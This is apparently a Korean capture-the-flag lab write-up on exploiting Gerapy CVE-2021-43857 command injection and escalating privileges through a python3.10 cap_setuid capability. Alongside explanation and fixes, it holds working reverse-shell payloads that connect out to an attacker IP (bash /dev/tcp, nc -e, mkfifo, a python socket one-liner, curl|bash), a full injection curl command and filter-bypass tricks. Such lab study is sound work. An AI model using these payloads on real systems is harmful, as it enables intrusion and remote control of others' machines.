`[유용]` 반대로 wheel 은 `-d` 디렉터리에서 지워도 `~/.cache/pip/http-v2/` 에 `.body` 로 남는다. 나중에 "받은 적 있었나"를 되짚을 때 1차 사료가 된다 — 이 노트의 증거 B가 그 캐시로 복원됐다(1-2 재현 절차).

시험장에서 3분 안에 끝내는 압축판은 이렇다. 배너·푸터·`generator` 로 후보 범위만 잡고(신뢰는 하지 않는다), 그 제품의 CVE 패치 버전을 찾은 뒤(예: "0.9.8에서 수정"), 패치 커밋의 관측 가능한 부작용 하나만 확인한다 — URL 패턴, 응답 필드 추가, 파라미터 이름 변경. 확인되면 바로 익스플로잇으로 넘어간다. 자산 해시 대조 같은 정밀 작업은 경계 판정이 애매할 때만 한다.

### 2-2. 배경 지식 — `DEBUG = True` 는 왜 취약점 클래스인가

Django는 `DEBUG=True`일 때 예외를 **개발자용 페이지**로 렌더한다. 여기서 새는 것이 셋이다.

| 노출 | 내용 | 공격 가치 |
|---|---|---|
| URLconf 덤프 (404) | "Django tried these URL patterns, in this order" 아래에 모든 라우트 정규식 | 열거 완전 생략. 이 박스에서 `^api/project/(\S+)/parse` 를 여기서 얻었다 |
| 스택트레이스 + 로컬 변수 (500) | 프레임별 지역 변수값 | DB 연결 문자열·토큰·경로가 그대로 보이는 경우가 많다 |
| 설정 덤프 (500) | `settings` 전체 (`SECRET_KEY`·`PASSWORD` 등 키워드 매칭 항목만 마스킹) | 마스킹을 피한 키(`SALT`·`SEED`·커스텀 이름)는 그대로 나온다 |

> [!warning] `DEBUG=True` 가 `ALLOWED_HOSTS` 를 느슨하게 만든다는 것은 거짓이다 — 이전 판본이 네 번째 행으로 적어뒀던 것
> Django 문서상 동작은 정반대다. `DEBUG=True` 이고 `ALLOWED_HOSTS` 가 빈 리스트일 때만 `['.localhost', '127.0.0.1', '[::1]']` 로 대체되니, 완화가 아니라 로컬호스트로 좁혀지는 것이다.
> 그리고 이 박스는 `192.168.x.x` 로 정상 접근되므로 오히려 `ALLOWED_HOSTS` 에 `*` 가 명시돼 있다는 뜻이고, 그건 `DEBUG` 와 무관한 별개의 설정이다.
> "디버그 모드니까 이것저것 느슨하겠지"라는 추론이 만든 오류다. `DEBUG` 가 실제로 무엇을 켜고 끄는지는 문서 한 줄로 확인된다.

이것이 정보 노출에 그치지 않는다는 점이 중요하다. 이 박스에서 `DEBUG=True` 는 취약점 하나라기보다 취약점을 찾는 시간을 0으로 만든 도구였다. 다른 서비스였다면 URL을 브루트포싱하다 `parse` 엔드포인트를 영영 못 찾았을 수도 있다.

### 2-3. 배경 지식 — `shell=True` 명령주입

Python에서 `subprocess.Popen(cmd, shell=True)` 또는 `os.system(cmd)` 는 문자열을 `/bin/sh -c "<cmd>"` 로 넘긴다. 문자열이 셸 파서를 거친다는 뜻이고, 셸 파서는 아래 문자를 명령 구분자나 치환자로 해석한다.

| 메타문자 | 의미 | 출력이 필요한가 |
|---|---|---|
| `` `cmd` `` | 명령 치환(POSIX) — 원 명령의 인자 위치에 그대로 끼워도 문법이 안 깨진다 | 불필요 |
| `$(cmd)` | 명령 치환(현대 문법) — 백틱과 동등, 중첩에 강함 | 불필요 |
| `;` `\n` | 명령 종료 후 다음 명령 | 뒤 문법이 깨질 수 있음 |
| `\|` | 파이프 | 앞 명령의 종료를 요구 |
| `&&` `\|\|` | 조건부 연쇄 | 앞 명령의 종료코드에 의존 |
| `&` | 백그라운드 실행 | 응답 지연 회피에 유용 |

왜 이 박스에서는 백틱인가. 일반론과 이 박스의 사실을 분리해서 읽어야 한다.

일반론(참, 다른 박스에서 유효): 주입 지점이 명령의 중간 인자 위치이면 `;` 로 끊었을 때 뒤에 남은 인자들이 새 명령의 인자가 되어 문법이 깨질 수 있다. 백틱/`$()` 는 값이 놓일 자리를 그대로 유지한 채 안쪽만 실행하고 결과 문자열로 치환하므로 인자 위치 주입에서 가장 안전한 선택이다.

이 박스의 사실(원문 확인): `views.py:534-538` 이 조립하는 명령은

```python
cmd = 'gerapy parse {args_cmd} {project_path} {spider_name}'.format(...)
```

이고 `spider_name` 이 명령 문자열의 맨 끝이다. 뒤에 남는 인자가 없으므로 `;`·`&&`·개행도 그대로 통한다. 실행 파일도 `scrapy` 가 아니라 `gerapy` 다(이전 판본이 `scrapy` 로 적어뒀다). 그럼에도 페이로드가 백틱인 이유는 문법 때문이 아니라 EDB 50640이 그렇게 만들어져 있어서 그대로 따랐기 때문이다.

**`;`·`&&` 가 실패했다고 "주입이 안 된다"고 결론내지 마라.** 치환 계열을 함께 시도한다 — 이 규율은 이 박스가 아니라 위 일반론에서 나온다.

이건 블라인드 명령주입이다. 백틱의 결과 문자열은 `gerapy parse` 의 인자로 들어갈 뿐 HTTP 응답으로 돌아오지 않는다. `id` 를 주입해도 화면에서 확인할 수 없고, 확인 채널은 시간(`` `sleep 5` `` 후 응답 시간 비교)과 아웃바운드(`` `curl http://<칼리>/x` `` 또는 곧바로 리버스셸) 둘뿐이다. 이 박스는 아웃바운드가 열려 있어 확인 단계를 건너뛰고 바로 리버스셸을 던져도 됐다. 막혀 있었다면 `sleep` 으로 먼저 성립을 확인하는 것이 정석이다.

### 2-4. 왜 취약한가 — CVE-2021-43857 데이터 흐름

취약점은 `/api/project/<name>/parse` 의 `spider` 파라미터가 `shell=True` 서브프로세스로 흘러가는 것이다. 백틱이 그대로 실행된다.

추측할 필요는 없다. `gerapy-0.9.7/gerapy/server/core/views.py:502-541` 에서 군더더기를 걷어내면 다섯 줄이다:

```python
@api_view(['POST'])
@permission_classes([IsAuthenticated])          # ← 인증은 요구한다 (post-auth)
def project_parse(request, project_name):
    if request.method == 'POST':
        project_path = join(PROJECTS_FOLDER, project_name)   # 문자열 조립만. 존재 검사 없음
        data = json.loads(request.body)                      # ← DRF 파서가 아니다. 원시 바디를 직접 읽는다
        spider_name = data.get('spider')                     # ← 검증 0
        ...
        cmd = 'gerapy parse {args_cmd} {project_path} {spider_name}'.format(
            args_cmd=args_cmd, project_path=project_path, spider_name=spider_name)
        p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, close_fds=True)
```

데이터 흐름을 단계로 끊으면:

```
POST /api/project/pwn/parse      Authorization: Token <토큰>
  body: {"spider": "<사용자 입력>"}
        │
        ▼  ① json.loads(request.body) 로 원시 바디를 직접 파싱 → data.get('spider')  (검증 없음)
        ▼  ② 'gerapy parse … {spider_name}' 에 .format() 으로 삽입   (인용/이스케이프 없음)
        ▼  ③ Popen(cmd, shell=True) → /bin/sh -c "..."
        ▼  ④ sh가 백틱을 명령 치환으로 해석하고 실행
   app 권한으로 임의 명령 실행
```

> [!warning] ①을 "DRF가 `request.data` 로 꺼낸다"고 적으면 틀린다 — 이전 판본의 오류
> `project_parse` 도 `project_create` 도 `json.loads(request.body)` 로 원시 바디를 직접 읽는다. `request.data` 를 건드리지 않으므로 DRF 파서가 발동하지 않는다.
> 사소해 보이지만 결과가 갈린다 — `Content-Type` 헤더가 무관해진다(3장). 인증만 DRF가 처리하고 바디는 뷰가 손으로 읽는 구조다.
> **데이터 흐름을 적을 때 "프레임워크가 알아서 했겠지"로 한 홉을 채우지 마라.** 그 홉이 실제로 무엇인지가 곧 우회 조건이다.

세 가지가 겹쳐야 성립한다. ①에서 검증이 없고, ②에서 인용이 없고, ③에서 셸을 거친다. 이 중 하나만 고쳐도 막힌다.

| 결함 | 안전한 대안 |
|---|---|
| ① 입력 검증 없음 | 화이트리스트(스파이더 이름은 실제 존재하는 목록에서만) |
| ② 문자열 연결 | `shlex.quote()` — 단, 근본 해법은 아님 |
| ③ `shell=True` | `shell=False` + 리스트 인자 (`Popen(["gerapy","parse",project_path,spider])`) → 셸 파서를 아예 안 거치므로 메타문자가 그냥 문자열이 된다 |

`shell=True` 와 `shell=False` 의 차이는 이 한 줄이 전부다.

```python
Popen(f"gerapy parse {project_path} {spider}", shell=True)   # ← 취약: sh -c 로 넘어간다
Popen(["gerapy", "parse", project_path, spider])             # ← 안전: execve 인자 배열, 셸 없음
```

리스트 형태는 `` ` `` 나 `;` 가 들어와도 `gerapy` 에게 전달되는 하나의 인자 문자열일 뿐이다. 코드 감사에서 `shell=True`·`os.system`·`os.popen`·`commands.getoutput` 를 grep하는 이유가 이것이다.

CVE-2021-43857은 0.9.8에서 수정됐고, 이 취약점은 인증 후(post-auth)다 — `parse` 엔드포인트가 `Authorization: Token` 을 요구하기 때문이다.

그렇다고 "인증 필요"를 이유로 CVE를 넘기면 안 된다. CVSS는 인증 요구를 감점 요인으로 보지만 기본 자격증명이 살아 있으면 인증은 장벽이 아니다. 이 박스에서 `parse` 로 가는 문은 `admin:admin` 하나가 지키고 있었고, 그것이 무너지자 RCE까지 직행이다. 유일한 방벽도 아니었다 — `project_upload` 는 권한 데코레이터가 주석 처리돼 비인증으로 열려 있다(1-4). 시험에서도 같아서, "인증 후 RCE" CVE를 봤다면 먼저 기본 자격증명과 약한 비밀번호를 시도한다. 그 조합이 가장 흔한 출제 형태다.

### 2-5. 왜 이 페이로드인가 — 조각 해설

최종 페이로드는 이것이다:

```
{"spider":"`/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.207/4444 0>&1'`"}
```

층이 네 겹이다. 각 층이 왜 필요한지 위에서부터 벗겨본다.

| 층 | 조각 | 역할 | 빼면 어떻게 되나 |
|---|---|---|---|
| 1 | `` ` ... ` `` | 명령 치환 — 인자 자리를 유지한 채 안쪽을 실행 | 그냥 스파이더 이름 문자열로 취급되어 아무 일도 안 일어난다 |
| 2 | `/bin/bash -c '...'` | bash로 승격 | `shell=True` 는 `/bin/sh` 를 쓰고, Ubuntu의 `/bin/sh` 는 dash다. dash에는 `/dev/tcp` 도 `>&` 도 없다 → 조용히 실패한다 |
| 3 | `bash -i` | 대화형 셸 — 프롬프트·잡 제어가 붙는다 | 명령은 붙지만 프롬프트가 없어 쓰기 불편하다 |
| 4 | `>& /dev/tcp/192.168.45.207/4444` | stdout+stderr을 TCP 소켓에 리다이렉트. bash 전용 가상 경로다 | 출력이 안 돌아온다 |
| 4 | `0>&1` | stdin을 같은 소켓에서 읽는다 | 명령을 타이핑할 수 없는 반쪽 셸이 된다 |

**2층을 빼먹는 것이 이 유형 최대의 함정이다.** `` `bash -i >& /dev/tcp/IP/PORT 0>&1` `` 를 그대로 넣으면 백틱 안쪽이 dash로 실행된다. dash는 `/dev/tcp` 라는 가상 경로를 모르고 `>&` 문법도 지원하지 않는다 → **에러도 안 보이는 무반응**이다. "명령주입이 안 되나 보다"라고 오판하기 딱 좋다. 명령주입 페이로드는 항상 `/bin/bash -c '...'` 로 감싸는 습관을 들여라.

`/dev/tcp`가 아예 없는 환경(일부 컨테이너·`--enable-net-redirections` 비활성 빌드)에서는 아래로 갈아탄다:

```
`curl http://192.168.45.207/s.sh|bash`
`nc -e /bin/bash 192.168.45.207 4444`          # -e 없는 nc면 실패
`mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.207 4444 >/tmp/f`
`python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.45.207",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`
```

실제 `curl` 명령에서 페이로드가 이렇게 보이는 것은 인용이 5중으로 중첩되기 때문이다:

```
-d '{"spider":"`/bin/bash -c '"'"'bash -i >& /dev/tcp/192.168.45.207/4444 0>&1'"'"'`"}'
```

| 층 | 경계 문자 | 누가 해석하나 |
|---|---|---|
| 1 | `-d '...'` 바깥 작은따옴표 | 로컬 bash (curl 인자 만들기) |
| 2 | `{...}` | JSON 파서 (DRF) |
| 3 | `"spider":"..."` 큰따옴표 | JSON 문자열 |
| 4 | `` `...` `` | 원격 `/bin/sh` |
| 5 | `bash -c '...'` 작은따옴표 | 원격 `/bin/sh` → bash 인자 만들기 |

`'"'"'` 는 로컬 bash 문자열 안에 리터럴 `'` 를 넣는 관용구다 — 작은따옴표 닫기(`'`) → 큰따옴표로 감싼 작은따옴표(`"'"`) → 다시 열기(`'`).

**인용 중첩이 4겹을 넘으면 인코딩으로 회피하라.** 손으로 따옴표를 세는 순간 실수가 시작된다. 페이로드를 base64로 감싸면 인용 문제가 통째로 사라진다:

```bash
echo -n 'bash -i >& /dev/tcp/192.168.45.207/4444 0>&1' | base64 -w0
```

주입 문자열은 `` `echo <b64>|base64 -d|bash` `` 가 된다 — 영숫자와 `=`·`+`·`/` 뿐이라 어느 층에서도 안 깨진다. [[Hawat]]의 hex 리터럴(`0x3c3f...`), [[Exfiltrated]]의 base64 래핑과 같은 계열의 회피 기법이다.

### 2-6. 왜 EDB 50640만 프로젝트를 요구하는가 — 취약점 자체에 선행조건은 없다

> [!danger] 이전 판본은 여기서 "프로젝트 생성이 선행조건"이라고 단정했다 — 거짓이다
> 근거로 "프로젝트가 0개면 뷰가 프로젝트 디렉터리를 찾다가 명령 조립 지점에 도달하기 전에 실패한다"고 적었다.
> 1차 사료가 정반대를 말한다 — `views.py:502-541` 은 디렉터리 존재를 한 번도 검사하지 않는다:
> ```python
> project_path = join(PROJECTS_FOLDER, project_name)   # 문자열 조립. os.path.exists 검사 없음
> ...
> cmd = 'gerapy parse {args_cmd} {project_path} {spider_name}'.format(...)
> p = Popen(cmd, shell=True, ...)
> ```
> `project_path` 는 그냥 문자열 하나이고 그대로 명령줄에 실린다. 그리고 셸은 `exec` 이전에 명령 치환을 먼저 처리하므로, `gerapy parse` 가 존재하지 않는 경로를 보고 죽든 말든 백틱은 이미 실행된 뒤다.
> → **프로젝트가 0개여도, 아무 이름을 넣어도 주입은 발화한다.**

증거는 EDB 50640 자신 안에 있다. 스크립트는 프로젝트 *이름*을 얻어놓고 정작 주입은 숫자 id 로 던진다:

```python
id = dict3['id']
...
r5 = r.post(url + "/api/project/" + str(id) + "/parse", data=payload, headers=auth_token)
```

즉 실제로 호출되는 것은 `/api/project/1/parse` 이고, 서버가 조립하는 경로는 `PROJECTS_FOLDER/1` — 존재하지 않는 디렉터리다(생성된 디렉터리 이름은 `pwn` 이지 `1` 이 아니다). 그런데도 이 익스플로잇은 동작한다. 디렉터리 존재가 무관하다는 것을 익스플로잇이 스스로 증명하는 셈이다.

진짜 원인은 노트가 6장 ①에서 이미 짚은 것 하나뿐이다 — 50640.py 가 로컬에서 `dict3[0]['name']` 을 읽다 `IndexError` 로 죽는 것. 목록이 비면 `[0]` 이 터진다. 스크립트의 한계이지 취약점의 전제조건이 아니다.

| | 프로젝트 0개일 때 |
|---|---|
| 취약점 자체 (`curl` 수동 주입) | 성립한다. 아무 이름이나 넣으면 된다 |
| EDB 50640 | 로컬에서 `IndexError`. 타겟에 요청조차 안 간다 |

> [!danger] "익스플로잇이 실패한다"와 "취약하지 않다"를 같은 칸에 넣지 마라
> 이 노트가 무너진 지점이 여기다. 스크립트가 죽는 것을 보고 취약점 쪽에 없는 전제조건을 만들어 붙였고, 그 허구의 전제조건이 상단 요약·3장·6장 ④·7-1 까지 다섯 군데로 번졌다.
> 판별법은 한 줄이다 — **그 전제조건을 취약 코드 원문에서 찾을 수 있는가?** 못 찾으면 취약점의 성질이 아니라 도구의 성질이다.
>
> 그럼에도 "상태를 만들어야 도달하는 코드"라는 유형 자체는 실재한다. 업로드된 파일·등록된 사용자·저장된 작업이 최소 1개 있어야 그 분기로 흘러가는 앱이 흔하다. 다만 그 판정은 코드를 읽어서 내리는 것이지 스크립트가 죽는 것을 보고 역산하는 것이 아니다.

그렇다면 왜 이 노트도 프로젝트를 만들었는가. 만들 이유가 없지는 않다 — 만들면 EDB 50640 도 쓸 수 있게 되고, `gerapy parse` 가 경로를 못 찾아 뱉는 stderr 노이즈도 줄어든다. 편해서 만든 것이지 만들어야만 되는 것이 아니다. 이 차이를 노트가 흐리면 다음 박스에서 "먼저 뭘 만들어야 하나" 하며 없는 단계를 찾게 된다.

### 2-7. 이 클래스를 다시 만나면 — 인증 후 명령주입 일반 절차

Gerapy·Jenkins·Rundeck·Ajenti·Webmin·Cacti·Zabbix·LibreNMS 는 전부 관리 UI가 백엔드 명령을 대신 실행해주는 제품이다. 사용자 입력이 명령줄에 닿는 지점이 반드시 존재하고, 그것이 이 클래스의 항구적인 공격면이다.

① 주입 지점 후보를 고르는 기준. 모든 파라미터를 찔러볼 시간은 없으니 "이 값이 명령줄에 실릴 것 같은가"로 좁힌다.

| 파라미터가 뜻하는 것 | 명령줄에 실릴 가능성 | 예 |
|---|---|---|
| 실행 대상의 이름 | 매우 높음 | `spider`(이 박스) · `job` · `task` · `script` · `playbook` |
| 호스트/IP/도메인 | 매우 높음 | ping·traceroute·nmap 래퍼, `host` · `target` |
| 파일 경로/파일명 | 높음 | 백업·압축·변환 기능의 `filename` · `path` |
| 옵션 문자열 | 높음 | `args` · `options` · `flags` — 그대로 이어붙는 경우가 많다 |
| 숫자 ID · 불리언 | 낮음 | 대개 ORM/정수 캐스팅을 거친다 |

② 확인 사다리는 위험도가 낮은 것부터 올라간다. 리버스셸을 먼저 던지고 실패하면 원인이 주입 실패인지 아웃바운드 차단인지 구분이 안 된다.

| 단계 | 페이로드 | 무엇을 판정하나 | 관측 채널 |
|---|---|---|---|
| 1 | `` `id` `` | 문법이 안 깨지는가 (500이 안 나는가) | 응답 코드 |
| 2 | `` `sleep 5` `` | 명령이 실제로 실행되는가 | 응답 시간 ← 가장 확실 |
| 3 | `$(sleep 5)` | 백틱이 필터링됐을 때의 대체 | 응답 시간 |
| 4 | `` `curl http://KALI/a` `` / `` `ping -c1 KALI` `` | 아웃바운드가 열려 있는가 | 칼리의 `nc -lvnp 80` · `tcpdump -i tun0 icmp` |
| 5 | 리버스셸 | 최종 | 리스너 |

> [!danger] 4단계를 건너뛰면 실패 원인을 특정할 수 없다
> 2단계(`sleep`)가 통했는데 5단계가 안 붙으면 주입은 성립했고 아웃바운드가 문제다. 포트를 443·80·53으로 바꾼다.
> 2단계부터 안 통하면 주입 자체가 실패한 것이다. 메타문자를 바꾸거나(`` ` `` → `$()` → `;` → 개행 `%0a`) 주입 지점을 바꾼다.
> 이 박스는 4444가 그대로 뚫려서 사다리를 건너뛰어도 됐지만, **막힌 박스에서는 이 구분이 30분을 가른다.**

③ 필터를 만났을 때의 우회 순서 — 공백 필터: `${IFS}` · `<` · `{cmd,arg}` / 슬래시 필터: `${HOME}` · `$(echo L2Jpbg==|base64 -d)` / 키워드 필터: `b""ash` · `b\ash` · `/bin/b?sh` / 전면 인코딩: base64 래핑(2-5).

④ 주입이 안 될 때 다음 후보 경로. 관리 UI 계열에서 인증을 얻은 뒤의 우선순위는 이렇다:

1. 명령 실행 기능 그 자체 — "스크립트 실행"·"작업 등록"·"플러그인 설치"가 UI에 있으면 주입이 아니라 정상 기능으로 RCE다 (Jenkins Script Console 패턴)
2. 파일 업로드 → 웹루트/실행 경로
3. SSTI — 템플릿을 사용자가 편집하는 기능
4. 경로 조작 — 백업·로그 뷰어의 `path` 파라미터로 `/etc/passwd`·`../` 읽기
5. 역직렬화 — 세션/쿠키/작업 정의가 pickle·Java serialized면

---

## 3. Foothold — CVE-2021-43857 명령주입

EDB 50640은 깨끗한 박스에서 그냥 죽는다. `searchsploit -m 50640` 으로 받은 스크립트가 `/api/project/index` 응답에서 `dict3[0]['name']` 을 읽는데, Levram에는 프로젝트가 0개라서 곧바로 `IndexError` 로 터진다. 타겟에는 주입 요청이 가지도 않는다. 브리핑은 "프로젝트 생성 기능을 통해 명령이 실행된다"고 하지만 주입 지점은 `parse` 이고, 취약점 자체에 선행조건은 없다(2-6). 아래 프로젝트 생성은 스크립트를 살리기 위한 편의이므로 수동 `curl` 만 쓸 거라면 건너뛰어도 된다.

프로젝트 생성 (스크립트를 쓸 때만 필요):

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ TOK=710dcf5387645f05a0484347be4a8509ea749008

┌──(kali㉿kali)-[~/PG/Levram]
└─$ curl -s -X POST http://192.168.248.24:8000/api/project/create \
     -H "Authorization: Token $TOK" -H 'Content-Type: application/json' \
     -d '{"name":"pwn","description":"pwn"}'
{"id": 1, "name": "pwn", ...}
```

> [!warning] `-H 'Content-Type: application/json'` 은 이 엔드포인트에서는 없어도 된다 — 이전 판본이 "빼면 400"이라고 단정했던 자리
> 그 단정은 DRF가 바디를 파싱한다는 전제 위에 서 있었는데, `project_create` 도 `project_parse` 도 `json.loads(request.body)` 로 원시 바디를 직접 읽는다(2-4). `request.data` 를 건드리지 않으므로 파서가 발동하지 않고 Content-Type 은 무관하다.
>
> 반증 사례가 이 노트 안에 있었다 — EDB 50640은
> ```python
> r5 = r.post(url + "/api/project/" + str(id) + "/parse", data=payload, headers=auth_token)
> ```
> 로 던진다. `data=` 에 문자열을 주면 `requests` 는 Content-Type 을 붙이지 않는데도 그 스크립트는 동작한다.
>
> 그래도 붙이는 습관 자체는 유지하는 편이 낫다. DRF 뷰 중 `request.data` 를 쓰는 것이 대다수이고 그쪽에서는 실제로 필요하다. 다만 "400이 나면 Content-Type 탓"이라는 반사가 원인을 가릴 수 있다. `json.loads(request.body)` 로 읽는 뷰는 바디가 유효한 JSON이 아닐 때 400이 아니라 500(`JSONDecodeError`)을 뱉으므로 응답 코드로 원인이 갈린다.

주입 — 리스너를 먼저 띄우고:

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ tmux new-session -d -s levram 'rlwrap nc -lvnp 4444'

┌──(kali㉿kali)-[~/PG/Levram]
└─$ curl -s -X POST http://192.168.248.24:8000/api/project/pwn/parse \
     -H "Authorization: Token $TOK" -H 'Content-Type: application/json' \
     -d '{"spider":"`/bin/bash -c '"'"'bash -i >& /dev/tcp/192.168.45.207/4444 0>&1'"'"'`"}'
```

리스너 명령의 조각별 역할:

| 조각 | 역할 |
|---|---|
| `tmux new-session -d -s levram` | 셸을 백그라운드 세션에 격리. 터미널을 닫아도 리버스셸이 안 죽는다 |
| `rlwrap` | 방향키·히스토리·백스페이스를 살려준다. TTY 업그레이드 전까지의 생존 도구 |
| `nc -l` | 리슨 모드 |
| `-v` | 접속이 붙는 순간을 출력 |
| `-n` | DNS 역조회 안 함 — 느려지고 흔적을 남긴다 |
| `-p 4444` | 포트 지정 |

**리스너가 없으면 페이로드는 조용히 실패하고, 재시도해도 같은 결과를 본다.** 명령주입은 블라인드라 실패 원인이 안 보이니 "리스너 먼저"는 반사 동작이어야 한다.

```bash
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.24] 46158
bash: cannot set terminal process group (846): Inappropriate ioctl for device
app@ubuntu:~/gerapy$ id
uid=1000(app) gid=1000(app) groups=1000(app)
```

**`cannot set terminal process group` 은 에러가 아니다.** 리버스셸에는 제어 터미널(controlling TTY)이 없어서 `bash -i` 가 잡 제어를 설정하려다 실패한 것뿐이고, 셸은 정상 동작한다. 이 메시지를 보면 곧바로 TTY 업그레이드로 넘어간다:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z ; stty raw -echo; fg ; Enter ; export TERM=xterm
```

이 박스는 Django가 파이썬으로 돌므로 `python3` 가 반드시 있다 — 서비스 스택이 곧 사용 가능한 도구 목록이다. (`python3` 가 없는 최소 설치라면 `script -qc /bin/bash /dev/null`. [[Hawat]] 참조)

> [!note] 스크립트 방식은 이 세션에서 재실행하지 않았다 `[가정]`
> 프로젝트를 만들었으므로 `dict3[0]['name']` 은 더 이상 터지지 않는다. 다만 끝까지 도는 것을 실제로 확인한 기록이 없다. 산출물에 남은 것은 수동 `curl` 경로(`trigger.sh`)뿐이다.
> 소스로 확인되는 범위까지만 적으면 — 스크립트가 다음으로 읽는 `GET /api/project/<name>/build` 는 egg가 없어도 `Project(name=project_name).save()` 로 레코드를 만들고 `model_to_dict` 를 돌려주므로(`views.py:439-472`) `dict3['id']` 는 존재한다. 즉 소스상 막히는 지점은 보이지 않는다.
> 별도 전제 하나는 남는다 — 50640.py 는 `pyfiglet` 을 import 하므로 없으면 시작도 못 한다(`pip install pyfiglet`).
> **여기서 이 노트가 배울 것: "통한다"고 쓰려면 돌려봐야 한다. 소스가 막을 이유를 못 찾은 것은 "안 막힌다"까지이지 "통했다"가 아니다.**

user 플래그:

```bash
app@ubuntu:~$ cat /home/app/local.txt
367447fc2401d598d4368ed12eb7ca2d
```

---

## 4. 권한상승

### 4-1. 셸을 잡자마자 칠 것

```bash
id                                   # 소속 그룹 (docker·lxd·adm·sudo가 보이면 즉시 그쪽)
sudo -l                              # NOPASSWD 항목
find / -perm -4000 -type f 2>/dev/null   # SUID
getcap -r / 2>/dev/null              # ← 이 박스의 정답
cat /etc/crontab; ls -la /etc/cron.*     # 크론
cat /etc/systemd/system/*.service    # ← 이 박스의 두 번째 정답
```

> [!note] 원문에 기록이 남은 것은 `id`·`getcap`·`app.service` 셋이다
> `sudo -l`·SUID·크론의 실제 출력은 노트에 남아 있지 않다. `[가정]` — 이 박스에서는 세 항목이 소득 없이 끝났고, 그래서 기록되지 않았다.
> **시험에서는 소득이 없어도 "돌렸다"는 사실을 남겨라.** 나중에 되돌아와 같은 걸 다시 돌리는 것이 가장 흔한 시간 낭비다.

### 4-2. 배경 지식 — Linux capabilities

capability는 SUID를 조각낸 것이다. 전통적 유닉스에는 권한이 uid 0(전능)과 그 외(무력) 둘뿐이었다. `ping` 이 raw 소켓을 열려면 root여야 했고 그래서 `ping` 에 SUID root를 걸었는데, 그러면 `ping` 하나가 뚫릴 때 곧바로 전체 root가 된다. Linux 2.2부터는 root의 권한을 약 40개의 조각으로 쪼개서 `ping` 에는 `cap_net_raw` 하나만 준다. 뚫려도 raw 소켓 이상은 못 한다.

| | SUID | File capability |
|---|---|---|
| 부여 방법 | `chmod u+s` | `setcap cap_xxx=ep <파일>` |
| 확인 방법 | `find / -perm -4000` | `getcap -r /` |
| 얻는 권한 | 파일 소유자의 전체 권한 | 지정한 조각만 |
| `ls -la`에서 보이나 | 보인다 (`-rwsr-xr-x`) | **안 보인다** ← 놓치기 쉬운 이유 |
| 그냥 `cp` 로 복사하면 | 사라진다 | 사라진다 |
| `cp -p`(또는 `-a`)로 복사하면 | root로 하면 유지 | 확장속성이라 `--preserve=xattr` 까지 필요 |

> [!warning] "SUID는 복사해도 대개 유지된다"는 것은 거짓이다 — 이전 판본의 표에 있던 줄
> Kali에서 그대로 때려본 결과다:
> ```bash
> ┌──(kali㉿kali)-[/tmp/cptest]
> └─$ ls -l s ; cp s c1 ; sudo cp s c2 ; sudo cp -p s c3 ; ls -l c1 c2 c3
> -rwsr-xr-x 1 root root 43432 s        ← 원본
> -rwxr-xr-x 1 kali kali 43432 c1       ← 일반 사용자 cp: s 비트 소실
> -rwxr-xr-x 1 root root 43432 c2       ← root cp:      s 비트 소실
> -rwsr-xr-x 1 root root 43432 c3       ← root cp -p:   s 비트 유지
> ```
> coreutils `cp` 는 `-p`/`-a` 없이는 setuid/setgid 비트를 옮기지 않는다. root로 복사해도 마찬가지다.
> 실무 함의: SUID 바이너리를 `/tmp` 로 복사해 놓고 나중에 쓰려는 계획은 그냥은 실패한다. 유지하려면 root 권한과 `cp -p` 가 둘 다 필요하고, 그럴 권한이 있으면 이미 privesc가 끝난 것이다.
> 그리고 capability 는 `cp -p` 로도 안 따라온다 — 확장속성이라 `--preserve=xattr` 또는 `getcap`/`setcap` 재부여가 필요하다.

`=ep` 표기를 읽는 법. capability는 파일에 세 집합으로 저장된다.

| 문자 | 집합 | 의미 |
|---|---|---|
| `p` | Permitted | 프로세스가 *가질 수 있는* 권한 |
| `e` | Effective | 실행 즉시 *활성화*되는가 (이 비트가 없으면 프로그램이 스스로 `capset()`으로 켜야 한다) |
| `i` | Inheritable | 자식 exec에 물려주는가 |

`cap_setuid=ep` 는 "CAP_SETUID를 허용하고, 실행하는 순간 켠 상태로 시작한다"는 뜻이다. 프로그램이 아무것도 안 해도 바로 쓸 수 있다.

`CAP_SETUID` 는 UID를 임의로 바꿀 수 있는 권한(`setuid`/`setreuid`/`setresuid`/`setfsuid`)이다. 파이썬 인터프리터가 이 권한을 들고 있으므로:

```
python3.10 실행 → CAP_SETUID가 effective 상태
  → os.setuid(0) 호출이 성공 → 프로세스의 uid/euid = 0
  → os.system('/bin/bash') → 그 bash가 uid 0을 물려받는다 → root 셸
```

인터프리터에 capability를 붙이면 이야기가 달라진다. 컴파일된 바이너리(`ping`)는 정해진 일만 하지만 인터프리터는 사용자가 준 아무 코드나 그 권한으로 실행한다. `setcap` 을 인터프리터에 거는 순간 그것은 조각난 권한이 아니라 범용 권한 부여가 된다.

보이면 즉시 GTFOBins로 넘어갈 capability 목록:

| capability | 얻는 것 |
|---|---|
| `cap_setuid` | uid 변경 → 직접 root |
| `cap_setgid` | gid 변경 |
| `cap_dac_read_search` | 모든 파일 읽기 (`/etc/shadow`) — DAC 우회 |
| `cap_dac_override` | 모든 파일 쓰기 (`/etc/passwd`에 root 계정 추가) |
| `cap_sys_admin` | 사실상 root — 마운트·네임스페이스 |
| `cap_sys_ptrace` | 다른 프로세스 메모리 주입 (root 프로세스에 셸코드) |
| `cap_sys_module` | 커널 모듈 로드 → 커널 레벨 root |
| `cap_chown` / `cap_fowner` | 소유권·권한 검사 우회 |
| `cap_net_raw` / `cap_net_bind_service` / `cap_net_admin` | 대개 정상. 스니핑·저번호 포트 바인드 |

### 4-3. Privesc A — `python3.10` cap_setuid

이걸 찾아준 것은 `linpeas.sh` 다. 셸에서 돌리자 파이썬 인터프리터의 capability를 짚어줬고(부록 A의 스크린샷), 거기서 곧바로 GTFOBins로 넘어갔다.

```bash
# 실제로 쓴 경로
app@ubuntu:~$ curl -s http://192.168.45.207/linpeas.sh | sh          # 또는 wget 후 실행
#  → "Capabilities" 섹션에서 /usr/bin/python3.10 이 강조되어 나온다
```

